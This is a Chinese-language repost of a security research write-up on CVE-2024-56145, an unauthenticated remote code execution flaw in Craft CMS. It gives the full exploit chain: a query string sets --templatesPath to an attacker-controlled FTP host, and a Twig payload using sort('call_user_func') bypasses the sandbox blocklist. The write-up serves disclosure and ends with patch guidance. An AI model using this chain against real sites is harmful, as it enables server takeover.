#  一个不起眼的 PHP 漏洞如何导致 Craft CMS 出现 RCE   
 Ots安全   2024-12-22 07:02  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
大多数开发人员都同意，与 15 年前相比，PHP 是一种更加理智、更加安全和可靠的语言。PHP5早期的不良设计已让位于更好的开发生态系统，其中包括类、自动加载、更严格的类型、更理智的语法以及一大堆其他改进。安全性也没有被忽视。  
  
register_globals  
一些老读者可能还记得和的黑暗岁月  
magic_quotes_gpc，幸运的是，这些日子已经过去了。在现代，许多剩余的安全漏洞也已得到修复或缓解；你再也无法通过简单的 获得 RCE  
 is_file('phar://...')，我们不再有，并且诸如和 之  
'abc' == 0类的危险结构已从语言中删除。  
assert($str)preg_replace('/.../e')  
  
然而，PHP 仍然有不少有趣的行为可能会让开发人员感到惊讶并导致安全问题，今天我们将阐明其中之一。  
  
Craft CMS 是全球最受欢迎的基于 PHP 的 CMS 之一，在全球拥有超过 150,000 个站点。它拥有蓬勃发展的开发者生态系统，并且非常受欢迎，甚至拥有自己的 StackExchange 网站。他们拥有健康、维护良好的代码库以及漏洞赏金计划。我们在本篇博文中展示了在 PHP 的常见（默认）配置下，我们可以实现未经身份验证的远程代码执行。  
  
Craft CMS 团队今天发布了他们的官方公告，并将此漏洞指定为 CVE-2024-56145。  
  
我们发现这项技术在大型企业和我们的攻击面管理平台的客户中普遍存在，需要我们的安全研究团队进行彻底的调查，以帮助我们的客户了解运行 Craft CMS 时他们在攻击面上的真实暴露情况。  
  
**注册_argc_argv 101**  
  
任何熟悉在命令行上使用 PHP 的开发人员都会熟悉  
$_SERVER['argc']和  
$_SERVER['argv']。正如您可能猜到的那样，这些是特殊变量，它们由运行 PHP 脚本时传递的命令行参数填充。例如，如果您编写了一个简单的 PHP 脚本：  
  
```
<?php var_dump($_SERVER['argv']);
```  
  
  
运行后  
php test.php foo bar baz你将得到：  
  
```
array(4) {
  [0]=>
  string(7) "test.php"
  [1]=>
  string(3) "foo"
  [2]=>
  string(3) "bar"
  [3]=>
  string(3) "baz"
}
```  
  
  
对于有 C 背景的人来说，这应该很熟悉。但是，如果您将此文件托管在 Web 服务器上，会发生什么？这由  
register_argc_argv中的配置变量控制  
php.ini。在 PHP 的默认配置中，处于开启状态，PHP 实际上将从查询字符串中  
register_argc_argv获取以空格分隔的内容：  
argv  
  
```
GET /test.php?foo+bar+bazarray(3) {
  [1]=>
  string(3) "foo"
  [2]=>
  string(3) "bar"
  [3]=>
  string(3) "baz"
}
```  
  
  
但是，填充此变量会影响性能，大多数 Web 应用程序不需要以这种方式接收参数。因此，发行版和共享主机也经常将此设置配置为关闭。如果  
register_argc_argv关闭，  
$_SERVER['argv']则不会填充。如果您在本地环境中下载了 PHP 并且现在测试它，则很有可能  
$_SERVER['argv']会为 NULL。  
  
如果您是一名开发人员，想要测试某个文件是否通过命令行或 Web 执行，您可能会尝试使用以下方法进行测试：  
  
```
if (isset($_SERVER['argv'])) {
  // cli ...
}
else {
  // web ...
}
```  
  
  
有时候，这会起作用！但只有  
register_argc_argv 设置为 off时才会起作用。如果您在 PHP 默认安装的 Web 服务器上运行此代码并传递查询字符串，则此代码将认为它是通过 CLI 运行的。至关重要的是，Craft CMS 官方 docker 有  
register_argc_argv = On。这为我们的漏洞埋下了伏笔。  
  
**定位错误**  
  
在 Craft CMS 应用程序中请求任何路径时加载的第一个文件之一是  
bootstrap/bootstrap.php。由于这会引导 Craft CMS Web 和  
craft控制台命令，它会检查是否已传递某些命令行选项：  
  
```
$findConfig = function(string $cliName, string $envName) {
    return App::cliOption($cliName, true) ?? App::env($envName);
};

// Set the vendor path. By default assume that it's 4 levels up from here
$vendorPath = FileHelper::normalizePath($findConfig('--vendorPath', 'CRAFT_VENDOR_PATH') ?? dirname(__DIR__, 3));

// Set the "project root" path that contains config/, storage/, etc. By default assume that it's up a level from vendor/.
$rootPath = FileHelper::normalizePath($findConfig('--basePath', 'CRAFT_BASE_PATH') ?? dirname($vendorPath));

// By default the remaining files/directories will be in the base directory
$dotenvPath = FileHelper::normalizePath($findConfig('--dotenvPath', 'CRAFT_DOTENV_PATH') ?? "$rootPath/.env");
//var_dump($dotenvPath);die;
$configPath = FileHelper::normalizePath($findConfig('--configPath', 'CRAFT_CONFIG_PATH') ?? "$rootPath/config");
$contentMigrationsPath = FileHelper::normalizePath($findConfig('--contentMigrationsPath', 'CRAFT_CONTENT_MIGRATIONS_PATH') ?? "$rootPath/migrations");
$storagePath = FileHelper::normalizePath($findConfig('--storagePath', 'CRAFT_STORAGE_PATH') ?? "$rootPath/storage");
$templatesPath = FileHelper::normalizePath($findConfig('--templatesPath', 'CRAFT_TEMPLATES_PATH') ?? "$rootPath/templates");
$translationsPath = FileHelper::normalizePath($findConfig('--translationsPath', 'CRAFT_TRANSLATIONS_PATH') ?? "$rootPath/translations");
$testsPath = FileHelper::normalizePath($findConfig('--testsPath', 'CRAFT_TESTS_PATH') ?? "$rootPath/tests");
```  
  
  
这将实际的检查委托给  
App::cliOption，如下所示：  
  
```
public static function cliOption(string $name, bool $unset = false): string|float|int|bool|null    {
        if (!preg_match('/^--?[\w-]+$/', $name)) {
            throw new InvalidArgumentException("Invalid CLI option name: $name");
        }

        if (empty($_SERVER['argv'])) {
            return null;
        }

        // We shouldn’t count on array being perfectly indexed
        $keys = array_keys($_SERVER['argv']);
        $nameLen = strlen($name);

        // ... process option ! ...
    }
```  
  
  
此函数根本不检查我们是否真的在 CLI 中，这意味着我们可以通过查询字符串设置这些选项！作为快速检查，传递类似的查询字符串  
?--configPath=/aaa将强制 Craft CMS 在无法访问的位置查找配置文件 - 在易受攻击的网站上它将如下所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeP9TDEP2IEsIN2sibJ29gPn2a27K7H7aqKLUy3iaB6H0AlcqkA3vUXscbu6x3qOzM4ZBglbrN7oCWg/640?wx_fmt=png&from=appmsg "")  
  
**利用漏洞**  
  
该漏洞本身并不复杂，可以相当快地跟踪和验证。但通往 RCE 的路径并不明确。作为一名安全研究人员，我们的直觉告诉我们，这个漏洞感觉像 RCE，但这里并不容易取胜，因为我们只控制加载文件的前缀。此时，我们尝试了几种“标准”选项，以将本质上是任意包含的内容升级为 RCE。此时，我们尝试了几种方法：  
  
目前还没有明确的方法来将文件上传到 Craft CMS 预授权，因此上传恶意文件  
.env似乎是不可能的。也许有一种方法可以通过  
PHP_SESSION_UPLOAD_PROGRESS技巧来实现，这种方法有据可查，但目前还不清楚序列化格式如何作为 dotenv 文件工作，此外，如果可能的话，我们希望避免混乱的竞争条件。  
  
configPath  
下一个选项是使用或执行某些操作  
templatesPath。这两个选项都会加载可执行代码。控制加载路径的前缀后，我们的第一直觉是使用  
http包装器远程包含一个文件，然后可以执行代码。这个想法很简单；如果我们提供诸如 之类的前缀  
http://malicious.example.com/，那么服务器将请求一个完全在我们的控制之下的文件。但是，在和 这  
http://malicious.example.com/config/default.php两种情况下，Craft CMS 都会在加载文件之前防御性地检查文件是否存在，检查方式如下：  
configPathtemplatesPath  
  
```
$path = $this->getConfigFilePath($filename);

        if (!file_exists($path)) {
            return [];
        }
```  
  
  
根据 PHP 文档，  
file_exists不支持 http 包装器（它属于  
stat()），因此此检查将始终失败。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeP9TDEP2IEsIN2sibJ29gPniaW5dnVkMKLQdvtfgPu6YicicXcJd10XM6RwQ98kfkMHuj3h6aglgp13A/640?wx_fmt=png&from=appmsg "")  
  
如果您关注当前流行的 PHP 开发趋势，您可能会想知道我们是否可以使用一些  
php://filter技巧，但由于同样的原因，这也不起作用；  
php包装器不支持  
stat()，因此  
file_exists在加载任何内容之前检查总是会失败。  
  
到目前为止，使用包装器的当前障碍是，我们考虑的所有包装器都不支持任何类型的file_exists调用。那么哪些包装器支持这些调用呢？查看受支持包装器的标准列表，并查看每个包装器的文档：  
  
-  
file://支持  
stat()，但这显然没有帮助；  
  
-  
phar://也支持  
stat()，但我们不能轻易地将有效的 PHAR 文件偷运到文件系统中；  
  
-  
ftp://确实支持一些文件系统调用，包括  
file_exists；有趣的......  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeP9TDEP2IEsIN2sibJ29gPno2uolZiawzojUI61aXBJFPkoVBf7d07xaic235icic8h97LPlUAoxytaFQ/640?wx_fmt=png&from=appmsg "")  
  
我们不能使用 FTP 包装器来包含配置文件，因为最终会调用  
includeFTP 包装器，并且会被安全功能阻止  
allow_url_include。但我们可以使用它来包含模板，只需通过简单  
file_get_contents调用即可读取模板。  
  
为了进行测试，如果您请求 Craft CMS 应用程序的根路径，它将尝试加载  
default/index.twig。因此，我们创建了一个允许匿名访问的 FTP 服务器，并提供  
index.twig如下所示的服务：  
  
```
hello world {{7*7}}
```  
  
  
事实上，我们可以看到 Craft CMS 加载了我们提供的文件，包括模板：  
  
```
GET /?--templatesPath=ftp://a:a@our.malicious.server:2121/ HTTP/1.1
Host: localhost:8000

...

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 19 Nov 2024 00:10:50 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
X-Powered-By: Craft CMS
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer-when-downgrade
Content-Length: 15

hello world 49
```  
  
  
从这里开始，任务几乎是微不足道的，除了还有一个障碍；如果你只是从互联网上粘贴一个 Twig 模板注入，如下所示，你可能会注意到它似乎不起作用：  
  
```
{{ ['id'] | filter('system') }}
```  
  
  
这是因为 Craft CMS 尝试对 Twig 模板渲染器进行沙盒处理，以防止恶意管理员用户（或者在共享托管环境中）。作为其中的一部分，他们对任何以函数名称作为参数的过滤器实施检查  
src/web/twig/Extension.php：  
  
```
private static function checkArrowFunction(mixed $arrow, string $thing, string $type): void    {
        if (
            is_string($arrow) &&
            in_array(ltrim(strtolower($arrow), '\\'), [
                'system',
                'passthru',
                'exec',
                'file_get_contents',
                'file_put_contents',
            ])
        ) {
            throw new RuntimeError(sprintf('The "%s" %s does not support passing "%s".', $thing, $type, $arrow));
        }
    }
```  
  
  
然而，这当然不是通过模板进行攻击的真正严重障碍。有很多方法可以绕过这一点，但我们使用了过滤  
sort器，它接受一个带有两个参数的函数，并传递了以下内容：  
  
```
{{ ['system', 'id'] | sort('call_user_func') }}
```  
  
  
由于  
call_user_func用作排序函数，它将被调用来比较  
'system'和  
'id'，执行  
call_user_func('system', 'id')。然后这将调用  
system('id')，而无需直接将系统函数传递给过滤器。编辑 FTP 主机上的文件以包含此有效负载，我们观察到我们已经实现了远程代码执行！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeP9TDEP2IEsIN2sibJ29gPnKfuVicOC1ugvHN7IW7FyNmFxx7TA4YxFQ3YXTZw43kz5KuOJEh0Rb6Q/640?wx_fmt=png&from=appmsg "")  
  
**结论**  
  
该标志的行为  
register_argc_argv并不直观，这可能不是以这种方式造成的最后一个安全漏洞。除非开发人员明确检查在 CLI 中运行的代码（例如，通过检查  
PHP_SAPI），否则使用编写的代码  
$_SERVER['argv']很可能容易受到与上述类似的攻击。  
  
Craft CMS 团队在不到 24 小时内迅速修复了此漏洞，并且任何正在运行  
5.5.2+或  
4.13.2+正在运行的安装都受到保护。如果由于某种原因无法升级，您只需  
register_argc_argv=Off在  
php.ini文件中进行配置即可。  
  
与往常一样，我们攻击面管理平台的客户已收到有关此漏洞的通知。我们将继续进行原创安全研究，努力告知客户其攻击面中的零日漏洞和 N 日漏洞。  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
